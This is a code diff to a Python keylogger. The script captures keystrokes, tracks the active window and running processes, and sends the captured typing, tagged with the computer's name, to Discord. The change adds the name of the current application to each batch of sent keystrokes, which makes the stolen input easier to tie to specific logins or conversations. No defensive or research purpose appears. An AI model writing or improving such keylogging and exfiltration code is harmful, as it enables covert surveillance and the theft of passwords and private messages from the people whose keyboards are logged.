@@ -27,6 +27,7 @@ last_activity_time = time.time()
 keystrokes = ""
 last_keystroke_time = time.time()
 keystroke_lock = threading.Lock()
+current_app = "Unknown"
 
 # Function to format duration
 def format_duration(seconds):
@@ -51,31 +52,31 @@ def send_to_discord(message):
 def get_active_window_title():
     hwnd = win32gui.GetForegroundWindow()
     if not hwnd:
-        return None, None, None  # Ensure three return values
+        return None, None, None
 
     _, pid = win32process.GetWindowThreadProcessId(hwnd)
     
     for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['pid'] == pid:
-            return proc.info['name'], win32gui.GetWindowText(hwnd), hwnd  # Return hwnd as well
+            return proc.info['name'], win32gui.GetWindowText(hwnd), hwnd
     
-    return None, None, None  # Ensure consistent return values
+    return None, None, None
 
 # Function to send keystrokes
 def send_keystrokes():
-    global keystrokes, last_keystroke_time
+    global keystrokes, last_keystroke_time, current_app
     
     with keystroke_lock:
         if keystrokes.strip():
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            send_to_discord(f"[{timestamp}] [Keystrokes] {PC_NAME}: {keystrokes}")
+            send_to_discord(f"[{timestamp}] [Keystrokes] {PC_NAME} ({current_app}): {keystrokes}")
             keystrokes = ""
     
     last_keystroke_time = time.time()
 
 # Function to log keystrokes
 def log_keystroke(event):
-    global keystrokes, last_activity_time, last_keystroke_time
+    global keystrokes, last_activity_time, last_keystroke_time, current_app
     
     last_activity_time = time.time()
     last_keystroke_time = time.time()
@@ -108,7 +109,7 @@ keystroke_thread.start()
 
 # Monitoring loop
 def monitor():
-    global last_logged, active_processes, app_start_times, last_activity_time, last_keystroke_time
+    global last_logged, active_processes, app_start_times, last_activity_time, last_keystroke_time, current_app
     
     while True:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -117,6 +118,7 @@ def monitor():
             time.sleep(2)
             continue
         
+        current_app = app_name
         current_processes = {proc.info['name'] for proc in psutil.process_iter(['name'])}
         closed_processes = active_processes - current_processes
 
